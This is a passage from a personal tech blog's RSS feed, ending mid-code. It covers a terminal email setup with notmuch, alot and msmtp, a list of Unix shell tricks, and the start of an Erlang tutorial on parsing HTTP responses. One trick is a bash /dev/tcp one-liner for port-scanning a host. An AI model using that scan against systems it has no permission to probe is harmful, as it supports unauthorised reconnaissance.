Otherwise you will have mails hanging around with the tag &lt;em&gt;tofilter&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;notmuch tag -tofilter -- tag:tofilter
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Theses steps can be put in a bash script and run from &lt;em&gt;maildir-notmuch-sync&lt;/em&gt; through
the &lt;em&gt;TAG_SCRIPT&lt;/em&gt; config.&lt;/p&gt;
&lt;h2&gt;maildir-notmuch-sync - the tags/folders sync script&lt;/h2&gt;
&lt;p&gt;This script was originally written by &lt;a href="http://ethanschoonover.com/"&gt;Ethan
Schoonover&lt;/a&gt;.
It is available on github under &lt;a href="https://github.com/mturquette/ghar-email/blob/master/.local/bin/maildir-notmuch-sync"&gt;this
link&lt;/a&gt;.
The original script's purpose is to synchronize notmuch tags with remote IMAP servers
and more specifically with gmail.&lt;/p&gt;
&lt;p&gt;I modified it to be able to translate notmuch's tags into a maildir folder and
thus get my emails structured on the IMAP server for access with webmail.
My modified version is available
&lt;a href="https://github.com/deadc0de6/scripts/blob/master/maildir-notmuch-sync"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The modified version will create a new folder (locally in maildir and remotely
through offlineimap) when a new
tag is used for the first time. Also emails will be copied around depending on
their tags.&lt;/p&gt;
&lt;p&gt;Let's say for example that you tag a new email with two tags: &lt;em&gt;family&lt;/em&gt; and
&lt;em&gt;toremember&lt;/em&gt;. This script will copy the email to two different folders in the
maildir, the &lt;em&gt;family&lt;/em&gt; folder and the &lt;em&gt;toremember&lt;/em&gt; folder (and create them if
they don't exist).
When offlineimap will be run, those will be copied to the remote IMAP server to
their respective folders.&lt;/p&gt;
&lt;p&gt;It is very convenient but also has its drawbacks. A single email might
co-exist in several different folders on your maildir and on your IMAP
server.&lt;/p&gt;
&lt;h2&gt;alot - the MUA&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/pazz/alot"&gt;alot&lt;/a&gt; is the interface to your emails.
It is terminal based and fully compatible with notmuch.&lt;/p&gt;
&lt;p&gt;Its main features (to me at least):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;modular and implemented in Python&lt;/li&gt;
&lt;li&gt;based on ncurses (through the &lt;a href="http://urwid.org/"&gt;urwid toolkit&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;vim/pentadactyl keybindings (although fully customizable)&lt;/li&gt;
&lt;li&gt;slick and powerful interface (buffer-based, colors, ...)&lt;/li&gt;
&lt;li&gt;PGP/MIME support&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Some useful configs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;sync INBOX folder and refresh when hitting comma&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shellescape&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;refocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;true&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;offlineimap -o -f INBOX&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;search&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;inbox&lt;/span&gt; &lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;unread&lt;/span&gt; &lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;flagged&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;edit new email with vim&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;editor_cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;vim -c &amp;quot;set textwidth=72&amp;quot; -c &amp;quot;set wrap&amp;quot; -c &amp;quot;set spell&amp;quot; -c &amp;quot;set nocp&amp;quot;&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;use msmtp to send emails&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;accounts&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="n"&gt;personal&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;
      &lt;span class="n"&gt;realname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# your real name&lt;/span&gt;
      &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# your email address&lt;/span&gt;
      &lt;span class="n"&gt;sendmail_command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;msmtp&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;
      &lt;span class="n"&gt;sent_box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# the sent maildir folder&lt;/span&gt;
      &lt;span class="n"&gt;draft_box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;maildir&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;TODO&lt;/span&gt; &lt;span class="c"&gt;# the drafts maildir folder&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;use abook to search for contacts&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;accounts&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="p"&gt;[[[&lt;/span&gt;&lt;span class="n"&gt;abook&lt;/span&gt;&lt;span class="p"&gt;]]]&lt;/span&gt;
    &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;abook&lt;/span&gt;
    &lt;span class="n"&gt;abook_contacts_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;TODO&amp;quot;&lt;/span&gt; &lt;span class="c"&gt;# path to abook file&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can find more themes (with screenshots)
&lt;a href="https://github.com/pazz/alot/tree/master/extra/themes"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://youtu.be/D0Yuc_25ySw"&gt;This (old) screencast&lt;/a&gt; shows the use of alot.
A good resource is the &lt;a href="https://alot.readthedocs.org/en/latest/installation.html"&gt;alot
documentation&lt;/a&gt; which
lists all needed configuration options.&lt;/p&gt;
&lt;h2&gt;msmtp - the email sender&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://msmtp.sourceforge.net/"&gt;msmtp&lt;/a&gt; is a SMTP client that allows to easily
transfer emails to an SMTP server.
It is easily integrated into &lt;em&gt;alot&lt;/em&gt; by providing an account in its config files
as mentioned &lt;a href="https://alot.readthedocs.org/en/latest/configuration/accounts.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://msmtp.sourceforge.net/doc/msmtp.html"&gt;Here&lt;/a&gt;'s the complete manual on
msmtp to help correctly configure msmtp.&lt;/p&gt;
&lt;p&gt;You can also use gpg2/gpg-agent to provide a password to msmtp without writing it in
clear text in the config file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;passwordeval &lt;span class="s2"&gt;&amp;quot;gpg2 --quiet --for-your-eyes-only --no-tty --decrypt &amp;lt;password-file&amp;gt;.gpg&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;abook - the contact manager&lt;/h2&gt;
&lt;p&gt;One last thing missing to get a complete email stack is a contact manager. I
found &lt;a href="http://abook.sourceforge.net/"&gt;abook&lt;/a&gt; to fill all needed requirements.
Moreover it is fully compatible with alot which uses it to auto-complete &lt;em&gt;TO&lt;/em&gt;
when redacting.&lt;/p&gt;
&lt;p&gt;BTW &lt;a href="https://raw.githubusercontent.com/yaroot/scripts/master/vcard2abook.py"&gt;this
script&lt;/a&gt;
converts vcard to abook.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I've been using that setup for some weeks now and am very happy with it. It is
fast and the search feature is really doing it ! It takes some time to setup
all the right configs and keybindings but once settle, it's a bomb !
Last but not least, TUI rocks !&lt;/p&gt;
&lt;p&gt;Some more references:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cr.yp.to/proto/maildir.html"&gt;maildir&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://deferred.io/2016/01/18/notmuch-tags-gmail-labels-bidirectional-sync"&gt;notmuch-maildir-sync post&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://deferred.io/2016/01/18/how-i-email"&gt;how I email in 2016&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://deferred.io/posts/2013/01/13/email-workflow-for-champions.html"&gt;email workflow for champions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://offlineimap.readthedocs.org/en/next/MANUAL.html?highlight=keywords#sync-from-gmail-to-a-local-maildir-with-labels"&gt;offlineimap sync gmail&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/gauteh/abunchoftags"&gt;abunchoftags&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://catern.com/2014/05/15/mail-setup.html"&gt;A modern Unix mail setup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://sirex.bitbucket.org/alot.html"&gt;alot post&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://f-koehler.github.io/posts/2015-03-17-offlineimap-msmtp-gnupg.html"&gt;offlineimap and msmtp with gnupg&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Sat, 12 Mar 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-03-12:articles/email-stack.html</guid><category>email</category><category>offlineimap</category><category>alot</category><category>notmuch</category></item><item><title>Unix tricks</title><link>https://deadc0de.re/articles/unix-tricks.html</link><description>&lt;p&gt;Some neat unix tricks&lt;/p&gt;
&lt;h2&gt;port scanning using the shell&lt;/h2&gt;
&lt;p&gt;It is easy to port scan using simple unix tools&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;some host&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;$ port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;some port&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;timeout &lt;span class="m"&gt;3&lt;/span&gt; bash -c &lt;span class="s2"&gt;&amp;quot;echo &amp;gt;/dev/tcp/&lt;/span&gt;&lt;span class="nv"&gt;$host&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;$port&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;echo &lt;/span&gt;open &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nb"&gt;echo &lt;/span&gt;closed
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;sed in-place replacement with backup&lt;/h2&gt;
&lt;p&gt;Sed is often used to act on file in-place. It is very convenient to be able
on a single command line to also backup the file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# replace SOMETHING by ELSE in the file&lt;/span&gt;
&lt;span class="c"&gt;# and create a backup file named bar.txt.bak&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;sed -i.bak &lt;span class="s1"&gt;&amp;#39;s/SOMETHING/ELSE/g&amp;#39;&lt;/span&gt; bar.txt
&lt;span class="c"&gt;# remove from the third to the last line of the file&lt;/span&gt;
&lt;span class="c"&gt;# and create a backup file named bar.txt.bak&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;sed -i.bak &lt;span class="s1"&gt;&amp;#39;3,$d&amp;#39;&lt;/span&gt; bar.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;remove empty lines in file&lt;/h2&gt;
&lt;p&gt;Getting rid of empty lines in a file is easy with sed.
&lt;code&gt;/^$/&lt;/code&gt; will find lines with nothing between the beginning of the line (&lt;code&gt;^&lt;/code&gt;)
and the end of it (&lt;code&gt;$&lt;/code&gt;) and then &lt;code&gt;d&lt;/code&gt; deletes it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sed &lt;span class="s1"&gt;&amp;#39;/^$/d&amp;#39;&lt;/span&gt; &amp;lt;file-path&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;insert file in vim&lt;/h2&gt;
&lt;p&gt;It sometimes happen you want to insert a entire file at the cursor position
in vim. This is the command that will do that:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;:r &amp;lt;file-path&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;remove file with weird names&lt;/h2&gt;
&lt;p&gt;Sometimes you have files that get created (or you created them by error) that
are not that easy to remove without potentially messing things up
like for example &lt;em&gt;--&lt;/em&gt;, &lt;em&gt;~&lt;/em&gt;, &lt;em&gt;/&lt;/em&gt;, ...&lt;/p&gt;
&lt;p&gt;The trick is first to retrieve the inode number of that file by listing
all files in the directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls -i
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And then remove the file by its inode number using find:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;find . -inum &amp;lt;inode-num&amp;gt; -exec rm &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;reverse lines in file&lt;/h2&gt;
&lt;p&gt;You probably know &lt;code&gt;cat&lt;/code&gt;, well there's also &lt;code&gt;tac&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat /tmp/foo
Line 1
Line 2
Line 3
&lt;span class="nv"&gt;$ &lt;/span&gt;tac /tmp/foo
Line 3
Line 2
Line 1
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;get N random lines from a file&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;randomize-lines&lt;/code&gt; is a nice tool allowing to quickly (and easily) randomize
lines of a file. After installation, its binary is &lt;code&gt;rl&lt;/code&gt; (at least on debian).
Combining it with &lt;code&gt;head&lt;/code&gt; allows to retrieve N random lines from a file&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# retrieveing 100 random lines from foo.txt&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;rl foo.txt &lt;span class="p"&gt;|&lt;/span&gt; head -100
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;execute last command as root&lt;/h2&gt;
&lt;p&gt;I rarely use sudo, but when I need to, I usually forget it.
This allows to execute latest command with sudo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo !!
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;get your bandwidth from the cli&lt;/h2&gt;
&lt;p&gt;The tool &lt;a href="https://github.com/sivel/speedtest-cli"&gt;speedtest-cli&lt;/a&gt; is very useful
to retrieve the current download/upload speed.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;speedtest-cli &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;Download\|Upload&amp;#39;&lt;/span&gt;
Download: 711.94 Mbit/s
Upload: 264.28 Mbit/s
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">deadc0de</dc:creator><pubDate>Fri, 26 Feb 2016 00:00:00 +0100</pubDate><guid>tag:deadc0de.re,2016-02-26:articles/unix-tricks.html</guid><category>unix</category><category>cli</category><category>shell</category></item><item><title>HTTP response parsing with Erlang</title><link>https://deadc0de.re/articles/erlang-http-parsing.html</link><description>&lt;p&gt;The goal is to parse an HTTP response into two elements, the header
and the body. As everyone knows, the header is separated from the
body &lt;a href="https://tools.ietf.org/html/rfc2616"&gt;using two CRLFs&lt;/a&gt; (&lt;code&gt;\r\n&lt;/code&gt;).
Some freestylers (obviously not following the RFC) use two &lt;code&gt;\n&lt;/code&gt;. I however won't
deal with that in here.&lt;/p&gt;
&lt;p&gt;First get a HTTP response:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;GET / HTTP/1.1\r\n\r\n&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; nc google.com &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee /tmp/response
HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Found
Cache-Control: private
Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;UTF-8
Location: ...
Content-Length: 256
Date: ...
Server: GFE/2.0

&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;content-type&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text/html;charset=utf-8&amp;quot;&lt;/span&gt;&amp;gt;
&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;
&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;
The document has moved
&amp;lt;A &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/A&amp;gt;.
&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The response content is copied to &lt;code&gt;/tmp/response&lt;/code&gt;. With erlang,
this is easily read with &lt;a href="http://erlang.org/doc/man/file.html#read_file-1"&gt;file:read_file&lt;/a&gt;
(loading the content to a Binary) and then transforming the binary to a string
using &lt;a href="http://erlang.org/doc/man/erlang.html#binary_to_list-1"&gt;erlang:binary_to_list&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Erlang provides two interesting modules which help to deal with string:
&lt;a href="http://erlang.org/doc/man/string.html"&gt;string&lt;/a&gt; and &lt;a href="http://erlang.org/doc/man/lists.html"&gt;lists&lt;/a&gt;
(since a string is a list in erlang).
Looking for something to allow me to split a string into several tokens
based on a separator lead me to these solutions:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;tokenize&lt;/strong&gt; using &lt;a href="http://erlang.org/doc/man/string.html#tokens-2"&gt;string:tokens/2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;offset and sub-string&lt;/strong&gt; using &lt;a href="http://erlang.org/doc/man/string.html#str-2"&gt;string:str/2&lt;/a&gt;
     and &lt;a href="http://erlang.org/doc/man/string.html#substr-2"&gt;string:substr&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;offset and split&lt;/strong&gt; using &lt;a href="http://erlang.org/doc/man/string.html#str-2"&gt;string:str/2&lt;/a&gt; and
     &lt;a href="http://erlang.org/doc/man/lists.html#split-2"&gt;lists:split/2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;coding way&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Tokenize&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://erlang.org/doc/man/string.html#tokens-2"&gt;string:tokens/2&lt;/a&gt; allows
to split a string into a list of tokens.&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;this is a test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;this&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;is&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A disadvantage (or advantage) from this method is that adjacent separators are
treated as one as shown here:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I want to separate successive c in here&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;cc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;I want to separate su&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;essive &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot; in here&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;instead of the expected &lt;code&gt;["I want to separate su","essive c in here"]&lt;/code&gt; :-(&lt;/p&gt;
&lt;p&gt;Similarly when parsing HTTP response, we're looking to separate the
header from the body using the separator &lt;code&gt;\r\n\r\n&lt;/code&gt;. As shown this won't work
with &lt;code&gt;tokens&lt;/code&gt; since &lt;code&gt;\r\n\r\n&lt;/code&gt; will be treated as &lt;code&gt;\r\n&lt;/code&gt; and thus result in
the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Cache-Control: private&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Content-Type: text/html; charset=UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Location: ...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Content-Length: 256&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Date: ...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;Server: GFE/2.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;The document has moved&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
